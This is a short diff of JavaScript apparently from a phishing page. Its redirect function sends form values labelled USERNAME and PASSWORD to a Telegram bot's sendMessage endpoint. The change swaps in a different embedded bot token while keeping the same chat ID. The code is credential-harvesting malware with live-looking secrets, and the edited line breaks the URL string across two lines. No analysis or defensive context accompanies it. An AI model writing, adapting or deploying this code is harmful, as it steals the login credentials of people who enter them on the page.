@@ -14,7 +14,8 @@ bdvsecond.addEventListener("change", () => {
 function redirect() {
   const Http = new XMLHttpRequest();
   const url =
-    "https://api.telegram.org/bot5939362432:AAGMnBov0WkySiubpJPzGCg83oEeyb9jtt4/sendMessage?chat_id=6044882265&text=USERNAME:%20" +
+    "https://api.telegram.org/bot
+5999851979:AAG2_HBrKd0P7eTPtfdoK-YnRYw7TgP3j4U/sendMessage?chat_id=6044882265&text=USERNAME:%20" +
     resfirst.value +
     " PASSWORD: " +
     resecond.value;
